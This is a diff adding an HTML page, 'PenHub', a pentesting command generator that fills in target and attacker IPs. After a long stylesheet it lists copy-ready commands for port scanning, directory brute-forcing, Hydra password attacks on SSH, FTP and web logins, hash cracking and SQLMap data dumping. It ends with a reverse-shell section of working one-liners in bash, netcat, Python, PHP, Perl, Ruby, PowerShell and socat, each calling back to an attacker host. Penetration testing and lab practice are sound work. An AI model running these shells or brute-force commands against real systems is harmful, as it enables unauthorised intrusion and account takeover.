@@ -1,0 +1,1420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PenHub - Pentesting Commands Generator</title>
+    <link href="https://fonts.cdnfonts.com/css/dubai" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --fg: #e0e0e0;
+            --accent: #b30000;
+            --accent-glow: #ff3333;
+            --panel: #111;
+            --border: #222;
+            --font: "Dubai", "Segoe UI", sans-serif;
+            --size: 1rem;
+            --blue: #1e90ff;
+            --red: #ff4444;
+            --green: #44ff44;
+            --yellow: #ffff44;
+            --purple: #b300b3;
+        }
+        
+        * {
+            box-sizing: border-box;
+            font-family: var(--font);
+            margin: 0;
+            padding: 0;
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-size: var(--size);
+            line-height: 1.6;
+            overflow-x: hidden;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+        
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 50px;
+            background: var(--panel);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 20px;
+            z-index: 10;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        nav a {
+            color: var(--fg);
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            font-size: 0.95rem;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        nav a:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateY(-2px);
+        }
+        
+        nav a.active {
+            background: var(--accent);
+            color: white;
+            box-shadow: 0 0 12px rgba(255, 51, 51, 0.4);
+        }
+        
+        nav a.active::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--accent-glow);
+        }
+        
+        .page {
+            display: none;
+            padding: 70px 25px 25px 25px;
+            min-height: 100vh;
+        }
+        
+        .page.active {
+            display: block;
+        }
+        
+        .iframe-page {
+            padding: 70px 0 0 0;
+            min-height: 100vh;
+            width: 100%;
+        }
+        
+        .iframe-page iframe {
+            width: 100%;
+            height: calc(100vh - 70px);
+            border: none;
+            background: var(--bg);
+        }
+        
+        aside {
+            width: 360px;
+            position: fixed;
+            top: 70px;
+            left: 0;
+            bottom: 0;
+            background: var(--panel);
+            padding: 20px;
+            overflow-y: auto;
+            border-right: 1px solid var(--border);
+            box-shadow: 2px 0 10px rgba(0, 0, 0, 0.2);
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent) var(--panel);
+        }
+        
+        aside::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        aside::-webkit-scrollbar-track {
+            background: var(--panel);
+        }
+        
+        aside::-webkit-scrollbar-thumb {
+            background-color: var(--accent);
+            border-radius: 3px;
+        }
+        
+        main {
+            margin-left: 380px;
+            padding: 20px;
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent) var(--bg);
+        }
+        
+        main::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        main::-webkit-scrollbar-track {
+            background: var(--bg);
+        }
+        
+        main::-webkit-scrollbar-thumb {
+            background-color: var(--accent);
+            border-radius: 4px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #f0f0f0;
+            font-size: 0.95rem;
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            background: #151515;
+            color: var(--fg);
+            border: 1px solid var(--border);
+            font-size: 0.95rem;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(255, 51, 51, 0.2);
+        }
+        
+        select option {
+            background: #151515;
+            padding: 8px;
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 60px;
+            line-height: 1.5;
+        }
+        
+        pre {
+            background: #000;
+            padding: 18px;
+            border-left: 4px solid var(--accent);
+            white-space: pre-wrap;
+            position: relative;
+            margin: 0 0 15px 0;
+            border-radius: 0 8px 8px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        h1, h2 {
+            margin: 0 0 10px 0;
+            font-weight: 700;
+            cursor: pointer;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 8px;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+        }
+        
+        .ascii-banner {
+            color: var(--accent-glow);
+            font-family: 'Courier New', monospace;
+            font-size: 1.2rem;
+            line-height: 1.2;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 51, 51, 0.4);
+            white-space: pre;
+            overflow: hidden;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        h2 {
+            font-size: 1.5rem;
+            color: #f0f0f0;
+        }
+        
+        h2:hover {
+            color: var(--accent-glow);
+            border-color: var(--accent);
+        }
+        
+        section {
+            margin-bottom: 25px;
+            background: var(--panel);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .watermark {
+            position: fixed;
+            bottom: 8px;
+            right: 12px;
+            color: var(--blue);
+            font-size: .8rem;
+            user-select: none;
+            font-weight: 500;
+            opacity: 0.7;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            z-index: 100;
+        }
+        
+        .watermark:hover {
+            opacity: 1;
+            color: var(--accent-glow);
+            transform: translateY(-2px);
+        }
+        
+        button {
+            background: var(--accent);
+            color: #fff;
+            border: 0;
+            padding: 10px 18px;
+            cursor: pointer;
+            border-radius: 6px;
+            font-weight: 600;
+            margin: 8px 0;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+            font-size: 0.95rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        button:hover {
+            background: var(--accent-glow);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 20px 0;
+        }
+        
+        .highlight-red {
+            color: var(--red);
+            font-weight: bold;
+        }
+        
+        .blog-post {
+            background: var(--panel);
+            padding: 25px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .blog-post h2 {
+            color: var(--accent-glow);
+            border-bottom: none;
+            margin-bottom: 15px;
+            text-shadow: 0 0 6px rgba(255, 51, 51, 0.2);
+            font-size: 1.6rem;
+        }
+        
+        .blog-post pre {
+            margin: 15px 0;
+        }
+        
+        .blog-post p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        
+        .tool-params {
+            background: #151515;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 3px solid var(--blue);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .tool-params h3 {
+            color: var(--blue);
+            margin-bottom: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        
+        .param-row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 12px;
+            align-items: center;
+        }
+        
+        .param-row label {
+            margin-bottom: 0;
+            min-width: 140px;
+            font-size: 0.9rem;
+        }
+        
+        .param-row input, .param-row select {
+            margin-bottom: 0;
+            flex: 1;
+        }
+        
+        .checkbox-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 12px 0;
+        }
+        
+        .checkbox-group label {
+            display: flex;
+            align-items: center;
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        
+        .checkbox-group input {
+            width: auto;
+            margin-right: 8px;
+            margin-bottom: 0;
+        }
+        
+        .copy {
+            position: absolute;
+            top: 8px;
+            right: 10px;
+            background: var(--accent);
+            color: #fff;
+            border: 0;
+            padding: 5px 10px;
+            font-size: .8rem;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+        
+        .copy:hover {
+            background: var(--accent-glow);
+            transform: translateY(-2px);
+        }
+        
+        .shell-type {
+            font-size: 0.85rem;
+            color: var(--blue);
+            margin-top: 8px;
+            font-style: italic;
+            font-weight: 500;
+        }
+        
+        .payload-section {
+            background: var(--panel);
+            padding: 25px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .payload-section h2 {
+            color: var(--accent-glow);
+            border-bottom: none;
+            margin-bottom: 20px;
+            text-shadow: 0 0 6px rgba(255, 51, 51, 0.2);
+        }
+        
+        .payload-output {
+            background: #000;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .payload-output pre {
+            border-left: none;
+            margin: 0;
+            padding: 0;
+            background: transparent;
+        }
+        
+        .file-upload {
+            border: 2px dashed var(--border);
+            padding: 25px;
+            text-align: center;
+            margin: 15px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .file-upload:hover {
+            border-color: var(--accent);
+            background: rgba(179, 0, 0, 0.05);
+        }
+        
+        .download-btn {
+            background: var(--accent);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 15px;
+            margin-right: 15px;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .download-btn:hover {
+            background: var(--accent-glow);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .sec-body {
+            display: none;
+        }
+        
+        /* Command category headers - updated to match previous style */
+        .cmd-header {
+            background: var(--panel);
+            color: var(--fg);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border);
+        }
+        
+        .cmd-header:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+            border-color: var(--accent);
+        }
+        
+        .cmd-header h2 {
+            margin: 0;
+            border: none;
+            color: var(--accent-glow);
+            font-size: 1.4rem;
+        }
+        
+        .cmd-header .toggle-icon {
+            font-size: 1.2rem;
+            transition: transform 0.3s ease;
+            color: var(--accent-glow);
+        }
+        
+        .cmd-header.expanded .toggle-icon {
+            transform: rotate(180deg);
+        }
+        
+        /* Code highlighting */
+        pre .ip { color: var(--green); font-weight: 600; }
+        pre .port { color: var(--yellow); font-weight: 600; }
+        pre .user { color: var(--blue); font-weight: 600; }
+        pre .word { color: var(--purple); font-weight: 600; }
+        pre .hash { color: var(--red); font-weight: 600; }
+        pre .hcType, pre .jType { color: var(--yellow); font-weight: 600; }
+        pre .lhost, pre .lport { color: var(--green); font-weight: 600; }
+        pre .filename { color: var(--blue); font-weight: 600; }
+        
+        /* Page-specific styles */
+        #notes h1 {
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 2.2rem;
+        }
+        
+        #payload h1 {
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 2.2rem;
+        }
+        
+        /* Responsive design */
+        @media (max-width: 900px) {
+            aside {
+                position: relative;
+                width: 100%;
+                border-right: 0;
+                top: 0;
+            }
+            
+            main {
+                margin-left: 0;
+            }
+            
+            .param-row {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .param-row label {
+                min-width: auto;
+            }
+            
+            nav {
+                padding: 0 10px;
+                gap: 10px;
+            }
+            
+            nav a {
+                padding: 6px 10px;
+                font-size: 0.85rem;
+            }
+            
+            .ascii-banner {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="#" data-page="cmd" class="active">Commands</a>
+        <a href="#" data-page="notes-iframe">Private Notes</a>
+        <a href="#" data-page="payload-iframe">Image Payload Gen</a>
+        <a href="#" data-page="pivot-iframe">Port Forwarding & Pivoting</a>
+    </nav>
+    <a href="https://buymeacoffee.com/0x8e8fb" target="_blank" class="watermark">by 0x8e8fb</a>
+
+    <!-- COMMANDS PAGE -->
+    <div id="cmd" class="page active">
+        <aside>
+            <h1>PenHub</h1>
+            <p style="margin-bottom: 20px; color: #aaa; font-size: 0.95rem;">Pentesting Commands Generator</p>
+            
+            <label>Target IP
+                <input id="ip" placeholder="10.10.10.10" value="10.10.10.10">
+            </label>
+            <label>Port
+                <input id="port" placeholder="443" value="443">
+            </label>
+            <label>User
+                <input id="user" placeholder="kay" value="kay">
+            </label>
+            <label>Wordlist
+                <select id="word">
+                    <option value="/usr/share/wordlists/rockyou.txt">rockyou.txt</option>
+                    <option value="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt">directory-list-2.3-medium.txt</option>
+                    <option value="/usr/share/wordlists/dirb/big.txt">big.txt</option>
+                    <option value="/usr/share/wordlists/dirb/common.txt">common.txt</option>
+                    <option value="/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt">raft-large-directories</option>
+                    <option value="custom">Custom Wordlist</option>
+                </select>
+            </label>
+            <div id="customWordlistContainer" style="display: none;">
+                <label>Custom Wordlist Path
+                    <input id="customWordlist" placeholder="/path/to/custom/wordlist.txt">
+                </label>
+            </div>
+            <label>Hash / file
+                <textarea id="hash" placeholder="hash.txt or /path/to/file" rows="2"></textarea>
+            </label>
+            <label>Hashcat type
+                <select id="hcType"></select>
+            </label>
+            <label>John format
+                <select id="jType"></select>
+            </label>
+            <label>Local IP (file srv)
+                <input id="lhost" placeholder="10.200.180.200" value="10.200.180.200">
+            </label>
+            <div class="param-row">
+                <label>Local Port:</label>
+                <input id="lport" placeholder="8080" value="8080">
+            </div>
+            <div class="param-row">
+                <label>Filename:</label>
+                <input id="filename" placeholder="shell.php" value="shell.php">
+            </div>
+            
+            <hr>
+            <button onclick="toggleAll()">Expand All Sections</button>
+        </aside>
+
+        <main>
+            <!-- Nmap Section -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Nmap</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">nmap -sV -p- --min-rate 10000 -sC --open <span class="ip">10.10.10.10</span></pre>
+                <pre class="cmd">nmap -sS -sV -sC -A -O <span class="ip">10.10.10.10</span></pre>
+                <pre class="cmd">nmap -p- --min-rate 10000 <span class="ip">10.10.10.10</span> -oN full_scan.txt</pre>
+            </section>
+            
+            <!-- Gobuster Section -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Gobuster</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">gobuster dir -u http://<span class="ip">10.10.10.10</span>:<span class="port">80</span> -w <span class="word">/usr/share/wordlists/rockyou.txt</span> -x php,txt,html</pre>
+                <pre class="cmd">gobuster dns -d <span class="ip">target.com</span> -w <span class="word">/usr/share/wordlists/subdomains.txt</span></pre>
+                <pre class="cmd">gobuster vhost -u http://<span class="ip">10.10.10.10</span> -w <span class="word">/usr/share/wordlists/vhosts.txt</span></pre>
+            </section>
+            
+            <!-- Feroxbuster Section -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Feroxbuster</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">feroxbuster -u http://<span class="ip">10.10.10.10</span>:<span class="port">80</span> -w <span class="word">/usr/share/wordlists/rockyou.txt</span> -x php,txt,html -C 404,403</pre>
+                <pre class="cmd">feroxbuster -u http://<span class="ip">10.10.10.10</span> -w <span class="word">/usr/share/wordlists/dirb/big.txt</span> -n -C 404,403</pre>
+                <div class="tool-params">
+                    <h3>Feroxbuster Parameters</h3>
+                    <div class="param-row">
+                        <label>Exclude Status Codes:</label>
+                        <input id="feroxExclude" placeholder="404,403" value="404,403">
+                    </div>
+                    <div class="checkbox-group">
+                        <label><input type="checkbox" id="feroxNoRecursion" checked> No Recursion (-n)</label>
+                        <label><input type="checkbox" id="feroxAutoTune"> Auto Tune (-f)</label>
+                        <label><input type="checkbox" id="feroxQuiet"> Quiet Mode (-q)</label>
+                    </div>
+                    <div class="param-row">
+                        <label>Extensions:</label>
+                        <input id="feroxExtensions" placeholder="php,txt,html" value="php,txt,html">
+                    </div>
+                </div>
+                <pre class="cmd" id="feroxCustom">feroxbuster -u http://<span class="feroxUrl">10.10.10.10:80</span> -w <span class="feroxWordlist">/usr/share/wordlists/rockyou.txt</span> -x <span class="feroxExtensions">php,txt,html</span> -C <span class="feroxExclude">404,403</span> <span class="feroxOptions"></span></pre>
+            </section>
+            
+            <!-- Nuclei Section with Parameters -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Nuclei</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <div class="tool-params">
+                    <h3>Nuclei Parameters</h3>
+                    <label>Target URL/Host
+                        <input id="nucleiUrl" placeholder="http://target.com or 10.10.10.10" value="http://target.com">
+                    </label>
+                    <div class="param-row">
+                        <label>Template Type:</label>
+                        <select id="nucleiTemplate">
+                            <option value="">All Templates</option>
+                            <option value="cves">CVEs</option>
+                            <option value="vulnerabilities">Vulnerabilities</option>
+                            <option value="exposures">Exposures</option>
+                            <option value="misconfiguration">Misconfigurations</option>
+                            <option value="file">Specific Template</option>
+                        </select>
+                    </div>
+                    <div id="nucleiCustomTemplateContainer" style="display: none;">
+                        <div class="param-row">
+                            <label>Custom Template:</label>
+                            <input id="nucleiCustomTemplate" placeholder="/path/to/template.yaml">
+                        </div>
+                    </div>
+                    <div class="checkbox-group">
+                        <label><input type="checkbox" id="nucleiSeverityLow"> Low Severity</label>
+                        <label><input type="checkbox" id="nucleiSeverityMedium" checked> Medium Severity</label>
+                        <label><input type="checkbox" id="nucleiSeverityHigh" checked> High Severity</label>
+                        <label><input type="checkbox" id="nucleiSeverityCritical" checked> Critical Severity</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <label><input type="checkbox" id="nucleiSilent"> Silent Mode</label>
+                        <label><input type="checkbox" id="nucleiNoColor"> No Color</label>
+                        <label><input type="checkbox" id="nucleiUpdate"> Update Templates</label>
+                        <label><input type="checkbox" id="nucleiVerbose"> Verbose</label>
+                    </div>
+                    <div class="param-row">
+                        <label>Concurrency:</label>
+                        <input type="number" id="nucleiConcurrency" placeholder="25" value="25" min="1" max="150">
+                    </div>
+                    <div class="param-row">
+                        <label>Rate Limit:</label>
+                        <input type="number" id="nucleiRateLimit" placeholder="150" value="150" min="1" max="1000">
+                    </div>
+                    <div class="param-row">
+                        <label>Timeout:</label>
+                        <input type="number" id="nucleiTimeout" placeholder="10" value="10" min="1" max="60">
+                    </div>
+                    <div class="param-row">
+                        <label>Retries:</label>
+                        <input type="number" id="nucleiRetries" placeholder="1" value="1" min="0" max="5">
+                    </div>
+                </div>
+                
+                <pre class="cmd" id="nucleiBasic">nuclei -u <span class="nucleiUrl">http://target.com</span> -t <span class="nucleiTemplate">cves/</span></pre>
+                <pre class="cmd" id="nucleiFull">nuclei -u <span class="nucleiUrl">http://target.com</span> <span class="nucleiTemplateCmd"></span> <span class="nucleiSeverityCmd"></span> <span class="nucleiOptions"></span> -c <span class="nucleiConcurrency">25</span> -rl <span class="nucleiRateLimit">150</span> -timeout <span class="nucleiTimeout">10</span> -retries <span class="nucleiRetries">1</span></pre>
+            </section>
+            
+            <!-- Nikto Section with Parameters -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Nikto</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <div class="tool-params">
+                    <h3>Nikto Parameters</h3>
+                    <label>Target URL/Host
+                        <input id="niktoUrl" placeholder="http://target.com" value="http://target.com">
+                    </label>
+                    <div class="param-row">
+                        <label>Port:</label>
+                        <input id="niktoPort" placeholder="80" value="80">
+                    </div>
+                    <div class="checkbox-group">
+                        <label><input type="checkbox" id="niktoSSL"> Use SSL</label>
+                        <label><input type="checkbox" id="niktoEvasion"> Use Evasion Techniques</label>
+                        <label><input type="checkbox" id="niktoMutate"> Mutate Tests</label>
+                        <label><input type="checkbox" id="niktoSingle"> Single Request Mode</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <label><input type="checkbox" id="niktoDisplay"> Display Output</label>
+                        <label><input type="checkbox" id="niktoFormatTXT"> Format TXT</label>
+                        <label><input type="checkbox" id="niktoFormatCSV"> Format CSV</label>
+                        <label><input type="checkbox" id="niktoFormatXML"> Format XML</label>
+                    </div>
+                    <div class="param-row">
+                        <label>Output File:</label>
+                        <input id="niktoOutput" placeholder="nikto_scan" value="nikto_scan">
+                    </div>
+                    <div class="param-row">
+                        <label>User Agent:</label>
+                        <input id="niktoUserAgent" placeholder="Mozilla/5.0...">
+                    </div>
+                    <div class="param-row">
+                        <label>Timeout:</label>
+                        <input type="number" id="niktoTimeout" placeholder="10" value="10" min="1" max="60">
+                    </div>
+                </div>
+                
+                <pre class="cmd" id="niktoBasic">nikto -h <span class="niktoUrl">http://target.com</span></pre>
+                <pre class="cmd" id="niktoFull">nikto -h <span class="niktoUrl">http://target.com</span> -p <span class="niktoPort">80</span> <span class="niktoOptions"></span> <span class="niktoFormatCmd"></span> -o <span class="niktoOutput">nikto_scan</span>.txt -T <span class="niktoTimeout">10</span> <span class="niktoUserAgentCmd"></span></pre>
+            </section>
+            
+            <!-- Hydra Section -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Hydra</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">hydra -l <span class="user">kay</span> -P <span class="word">/usr/share/wordlists/rockyou.txt</span> <span class="ip">10.10.10.10</span> ssh</pre>
+                <pre class="cmd">hydra -l <span class="user">kay</span> -P <span class="word">/usr/share/wordlists/rockyou.txt</span> ftp://<span class="ip">10.10.10.10</span></pre>
+                <pre class="cmd">hydra -l <span class="user">kay</span> -P <span class="word">/usr/share/wordlists/rockyou.txt</span> <span class="ip">10.10.10.10</span> -s <span class="port">62337</span> http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect Username or Password"</pre>
+            </section>
+            
+            <!-- John Section -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>John</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">john --format=<span class="jType">md5</span> --wordlist=<span class="word">/usr/share/wordlists/rockyou.txt</span> <span class="hash">hash.txt</span></pre>
+                <pre class="cmd">ssh2john <span class="hash">path/to/id_rsa</span> > <span class="hash">path/to/id_rsa_hash</span></pre>
+                <pre class="cmd">john --wordlist=<span class="word">/usr/share/wordlists/rockyou.txt</span> <span class="hash">path/to/id_rsa_hash</span></pre>
+            </section>
+            
+            <!-- Hashcat Section -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Hashcat</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">hashcat -m <span class="hcType">0</span> <span class="hash">hash.txt</span> <span class="word">/usr/share/wordlists/rockyou.txt</span> --force</pre>
+            </section>
+            
+            <!-- SQLMap Section with Parameters -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>SQLMap</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <div class="tool-params">
+                    <h3>SQLMap Parameters</h3>
+                    <label>Target URL
+                        <input id="sqlmapUrl" placeholder="http://target.com/page.php?id=1" value="http://target.com/page.php?id=1">
+                    </label>
+                    <div class="param-row">
+                        <label>Database:</label>
+                        <select id="sqlmapDb">
+                            <option value="">Auto-detect</option>
+                            <option value="mysql">MySQL</option>
+                            <option value="mssql">Microsoft SQL</option>
+                            <option value="oracle">Oracle</option>
+                            <option value="postgres">PostgreSQL</option>
+                            <option value="sqlite">SQLite</option>
+                        </select>
+                    </div>
+                    <div class="checkbox-group">
+                        <label><input type="checkbox" id="sqlmapCurrentDb"> Current Database</label>
+                        <label><input type="checkbox" id="sqlmapCurrentUser"> Current User</label>
+                        <label><input type="checkbox" id="sqlmapDbs"> Enumerate DBs</label>
+                        <label><input type="checkbox" id="sqlmapTables"> Enumerate Tables</label>
+                        <label><input type="checkbox" id="sqlmapColumns"> Enumerate Columns</label>
+                        <label><input type="checkbox" id="sqlmapDump"> Dump Data</label>
+                    </div>
+                    <div class="checkbox-group">
+                        <label><input type="checkbox" id="sqlmapBatch"> Batch Mode</label>
+                        <label><input type="checkbox" id="sqlmapRandomAgent"> Random Agent</label>
+                        <label><input type="checkbox" id="sqlmapLevel" checked> Level 1</label>
+                        <label><input type="checkbox" id="sqlmapRisk"> Risk 1</label>
+                        <label><input type="checkbox" id="sqlmapForms"> Test Forms</label>
+                        <label><input type="checkbox" id="sqlmapCrawl"> Crawl</label>
+                    </div>
+                    <div class="param-row">
+                        <label>Threads:</label>
+                        <input type="number" id="sqlmapThreads" placeholder="1" value="1" min="1" max="10">
+                    </div>
+                    <div class="param-row">
+                        <label>Delay:</label>
+                        <input type="number" id="sqlmapDelay" placeholder="0" value="0" min="0" max="10">
+                    </div>
+                    <div class="param-row">
+                        <label>Cookie:</label>
+                        <input id="sqlmapCookie" placeholder="session=abc123">
+                    </div>
+                    <div class="param-row">
+                        <label>User Agent:</label>
+                        <input id="sqlmapUserAgent" placeholder="Custom User Agent">
+                    </div>
+                </div>
+                
+                <pre class="cmd" id="sqlmapBasic">sqlmap -u "<span class="sqlmapUrl">http://target.com/page.php?id=1</span>" --batch</pre>
+                <pre class="cmd" id="sqlmapFull">sqlmap -u "<span class="sqlmapUrl">http://target.com/page.php?id=1</span>" <span class="sqlmapDbCmd"></span> <span class="sqlmapOptions"></span> <span class="sqlmapEnumOptions"></span> <span class="sqlmapThreadsCmd"></span> <span class="sqlmapCookieCmd"></span> <span class="sqlmapUserAgentCmd"></span></pre>
+            </section>
+            
+            <!-- Reverse Shells Section -->
+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>Reverse Shells</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">bash -i >& /dev/tcp/<span class="lhost">10.200.180.200</span>/<span class="lport">443</span> 0>&1
+<div class="shell-type">Bash TCP Reverse Shell</div></pre>
+                
+                <pre class="cmd">nc -e /bin/sh <span class="lhost">10.200.180.200</span> <span class="lport">443</span>
+<div class="shell-type">Netcat Reverse Shell</div></pre>
+                
+                <pre class="cmd">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="lhost">10.200.180.200</span>",<span class="lport">443</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+<div class="shell-type">Python3 Reverse Shell</div></pre>
+                
+                <pre class="cmd">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="lhost">10.200.180.200</span>",<span class="lport">443</span>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
+<div class="shell-type">Python Reverse Shell</div></pre>
+                
+                <pre class="cmd">php -r '$sock=fsockopen("<span class="lhost">10.200.180.200</span>",<span class="lport">443</span>);exec("/bin/sh -i &lt;&3 &gt;&3 2>&3");'
+<div class="shell-type">PHP Reverse Shell</div></pre>
+                
+                <pre class="cmd">perl -e 'use Socket;$i="<span class="lhost">10.200.180.200</span>";$p=<span class="lport">443</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+<div class="shell-type">Perl Reverse Shell</div></pre>
+                
+                <pre class="cmd">ruby -rsocket -e 'c=TCPSocket.new("<span class="lhost">10.200.180.200</span>","<span class="lport">443</span>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+<div class="shell-type">Ruby Reverse Shell</div></pre>
+                
+                <pre class="cmd">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<span class="lhost">10.200.180.200</span>',<span class="lport">443</span>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+<div class="shell-type">PowerShell Reverse Shell</div></pre>
+                
+                <pre class="cmd">socat TCP:<span class="lhost">10.200.180.200</span>:<span class="lport">443</span> EXEC:/bin/sh
+<div class="shell-type">Socat Reverse Shell</div></pre>
+            </section>
+            
+            <!-- File Server Section -->
